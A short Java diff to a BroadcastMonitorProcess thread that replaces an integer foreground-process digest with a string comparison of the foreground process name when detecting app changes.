@@ -20,7 +20,7 @@ public class BroadcastMonitorProcess extends Thread {
 
 	private boolean stop;
 	private final int period;
-	int oldForeDigest = 0;
+	String oldForeDigest = "";
 
 	RunningProcesses runningProcess;
 
@@ -42,10 +42,10 @@ public class BroadcastMonitorProcess extends Thread {
 			if (stop) {
 				return;
 			}
-			runningProcess.update();
-			int foreDigest = runningProcess.getForegroundDigest();
 
-			if (foreDigest != oldForeDigest) {
+			String foreDigest = runningProcess.getForeground();
+
+			if (!foreDigest.equals(oldForeDigest)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (run), changed fore, dispatching");
 				}
